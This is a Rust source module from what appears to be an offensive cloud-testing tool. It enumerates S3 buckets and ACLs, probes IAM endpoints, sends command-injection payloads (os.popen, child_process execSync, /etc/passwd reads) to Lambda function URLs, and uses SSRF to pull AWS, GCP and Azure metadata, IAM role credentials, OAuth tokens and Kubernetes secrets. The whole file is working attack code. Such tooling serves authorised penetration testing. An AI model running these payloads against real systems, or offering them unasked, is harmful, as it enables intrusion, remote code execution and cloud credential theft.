use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

pub async fn s3(bucket: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} AWS S3 Bucket Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Bucket: {}", "[*]".cyan().bold(), bucket);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let urls = [
        format!("https://{}.s3.amazonaws.com", bucket),
        format!("https://{}.s3.us-east-1.amazonaws.com", bucket),
        format!("https://{}.s3.us-west-1.amazonaws.com", bucket),
        format!("https://{}.s3.us-west-2.amazonaws.com", bucket),
        format!("https://{}.s3.eu-west-1.amazonaws.com", bucket),
        format!("https://{}.s3.ap-southeast-1.amazonaws.com", bucket),
        format!("https://s3.amazonaws.com/{}", bucket),
    ];

    for url in &urls {
        match client.get(url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let exists = status == 200 || status == 403;
                let listable = status == 200 && body.contains("<ListBucketResult");
                let status_str = if listable {
                    "LISTABLE".red().bold().to_string()
                } else if exists {
                    "EXISTS".green().to_string()
                } else {
                    "not found".to_string()
                };
                println!(
                    "  {} {:55} status={} {}",
                    "*".cyan(),
                    url,
                    status,
                    status_str
                );

                if listable {
                    println!(
                        "    {} [HIGH] Bucket is publicly listable!",
                        ">".red().bold()
                    );
                    let keys: Vec<&str> = body.matches("<Key>").collect();
                    println!("    {} Found {} objects in listing", "*".cyan(), keys.len());
                }
            }
            Err(_) => {
                println!("  {} {:55} error", "*".cyan(), url);
            }
        }
    }

    let perms_url = format!("https://{}.s3.amazonaws.com/?acl", bucket);
    if let Ok(resp) = client.get(&perms_url).send().await {
        let status = resp.status().as_u16();
        let body = resp.text().await.unwrap_or_default();
        if status == 200 && body.contains("<AccessControlPolicy") {
            println!("\n{} [HIGH] ACL is readable!", "[!]".red().bold());
            if body.contains("AllUsers") || body.contains("Everyone") {
                println!(
                    "  {} Public access granted to AllUsers/Everyone!",
                    "*".red()
                );
            }
        } else if status == 403 {
            println!("\n{} ACL access denied (good).", "[-]".yellow().bold());
        }
    }

    println!("\n{} S3 enumeration complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn iam(token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} AWS IAM Abuse Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let endpoints = [
        (
            "STS GetCallerIdentity",
            "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15",
            "GET",
        ),
        (
            "IAM ListUsers",
            "https://iam.amazonaws.com/?Action=ListUsers&Version=2010-05-08",
            "GET",
        ),
        (
            "IAM ListRoles",
            "https://iam.amazonaws.com/?Action=ListRoles&Version=2010-05-08",
            "GET",
        ),
        (
            "IAM ListAccessKeys",
            "https://iam.amazonaws.com/?Action=ListAccessKeys&Version=2010-05-08",
            "GET",
        ),
        (
            "IAM ListPolicies",
            "https://iam.amazonaws.com/?Action=ListPolicies&Version=2010-05-08",
            "GET",
        ),
    ];

    for (name, url, method) in &endpoints {
        let req = if *method == "GET" {
            client.get(*url)
        } else {
            client.post(*url)
        };
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accessible = status == 200;
                let status_str = if accessible {
                    "ACCESSIBLE".red().bold().to_string()
                } else if status == 403 {
                    "denied".to_string()
                } else {
                    format!("status {}", status)
                };
                println!(
                    "  {} {:30} status={} {}",
                    "*".cyan(),
                    name,
                    status,
                    status_str
                );

                if accessible && body.contains("<UserName>") {
                    println!("    {} User data exposed!", ">".red().bold());
                }
            }
            Err(_) => {
                println!("  {} {:30} error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} IAM abuse test complete.", "[*]".cyan().bold());
    println!(
        "{} Note: These endpoints require AWS credentials (use --token with AWS access key).",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn lambda(function_url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} AWS Lambda Injection Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Function URL: {}", "[*]".cyan().bold(), function_url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        ("RCE via os.popen", r#"{"cmd":"id"}"#),
        ("RCE via subprocess", r#"{"command":"id"}"#),
        ("Env vars dump", r#"{"action":"env"}"#),
        ("File read /etc/passwd", r#"{"file":"/etc/passwd"}"#),
        (
            "SSRF metadata",
            r#"{"url":"http://169.254.169.254/latest/meta-data/"}"#,
        ),
        (
            "Node.js eval",
            r#"{"code":"require('child_process').execSync('id').toString()}"}"#,
        ),
        (
            "Python exec",
            r#"{"exec":"__import__('os').popen('id').read()"}"#,
        ),
        ("Command via event", r#"{"event":{"cmd":"id"}}"#),
    ];

    for (name, payload) in &payloads {
        match client
            .post(function_url)
            .header("Content-Type", "application/json")
            .body(payload.to_string())
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let interesting = body.contains("uid=")
                    || body.contains("root")
                    || body.contains("AWS_")
                    || body.contains("ami-")
                    || body.contains("169.254")
                    || body.contains("bin/sh");
                let status_str = if interesting {
                    "INTERESTING OUTPUT".red().bold().to_string()
                } else if status == 200 {
                    "ok".to_string()
                } else {
                    format!("status {}", status)
                };
                println!(
                    "  {} {:30} status={} {}",
                    "*".cyan(),
                    name,
                    status,
                    status_str
                );

                if interesting {
                    println!(
                        "    {} Output: {}",
                        ">".red().bold(),
                        body.chars().take(300).collect::<String>()
                    );
                }
            }
            Err(_) => {
                println!("  {} {:30} error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} Lambda injection test complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn metadata(target_url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Cloud Metadata Extraction (SSRF)", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), target_url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let metadata_urls = [
        ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/"),
        (
            "AWS IMDSv2 (token)",
            "http://169.254.169.254/latest/api/token",
        ),
        ("AWS User Data", "http://169.254.169.254/latest/user-data/"),
        (
            "AWS IAM Role",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ),
        (
            "GCP Metadata",
            "http://metadata.google.internal/computeMetadata/v1/",
        ),
        (
            "GCP Project",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        ),
        (
            "Azure Metadata",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ),
        (
            "Azure Token",
            "http://169.254.169.254/metadata/identity/oauth2/token",
        ),
        (
            "K8s Service Account",
            "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
        ),
    ];

    for (name, metadata_url) in &metadata_urls {
        let test_url = if target_url.contains("{ssrf}") {
            target_url.replace("{ssrf}", metadata_url)
        } else {
            metadata_url.to_string()
        };

        let mut req = client.get(&test_url);
        if name.starts_with("GCP") {
            req = req.header("Metadata-Flavor", "Google");
        }
        if name.starts_with("Azure") {
            req = req.header("Metadata", "true");
        }
        if name.starts_with("AWS IMDSv2") {
            req = req.header("X-aws-ec2-metadata-token-ttl-seconds", "21600");
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let interesting = status == 200 && !body.is_empty();
                let status_str = if interesting {
                    "EXPOSED".red().bold().to_string()
                } else if status == 403 {
                    "forbidden".to_string()
                } else if status == 404 {
                    "not found".to_string()
                } else {
                    format!("status {}", status)
                };
                println!(
                    "  {} {:25} status={} {}",
                    "*".cyan(),
                    name,
                    status,
                    status_str
                );

                if interesting {
                    println!(
                        "    {} Response: {}",
                        ">".red().bold(),
                        body.chars().take(200).collect::<String>()
                    );
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} Metadata extraction complete.", "[*]".cyan().bold());
    Ok(())
}
